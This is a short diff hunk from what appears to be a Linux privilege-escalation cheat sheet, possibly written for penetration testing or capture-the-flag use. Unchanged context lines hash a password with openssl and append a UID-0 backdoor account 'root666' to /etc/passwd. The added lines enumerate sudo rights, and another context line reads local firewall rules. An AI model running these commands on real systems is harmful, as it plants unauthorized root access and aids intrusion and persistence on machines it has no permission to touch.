@@ -29,6 +29,13 @@ openssl passwd assword
 fFXEX2n561kQ2
 echo "root666:fFXEX2n561kQ2:0:0:root:/root:/bin/bash" >> /etc/passwd
 
+#Does user have sudo rights
+sudo -v
+#What rights
+sudo -l
+#Others?
+sudo -l -U username
+
 #FW rules are might be saved locally
 cat /etc/iptables/rules.v2
 
